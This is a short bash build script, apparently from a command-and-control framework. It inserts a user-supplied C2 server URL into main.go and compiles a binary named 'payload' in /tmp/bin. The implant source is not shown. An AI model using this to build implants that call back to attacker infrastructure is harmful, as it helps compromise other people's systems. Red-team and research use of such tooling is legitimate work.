#!/bin/bash

# we need a c2 server url s
if [ $# -eq 0 ]
  then
    echo "No server supplied, sh build.sh your.c2.server.here.com"
    exit
fi

# check if /tmp/bin dir exists
if [ -d "/tmp/bin" ] 
then
    echo "Directory /tmp/bin exists. skipping" 
else
    mkdir /tmp/bin
fi

# lets replace the goc2 string with the cmd line argument
sed -i "s/goc2_server/https:\/\/$1/" main.go

# Now we build
go build -o /tmp/bin/payload

# Change the string back to original.
sed -i "s/https:\/\/$1/goc2_server/" main.go

# Done
echo "payload located at /tmp/bin/payload c2:$1"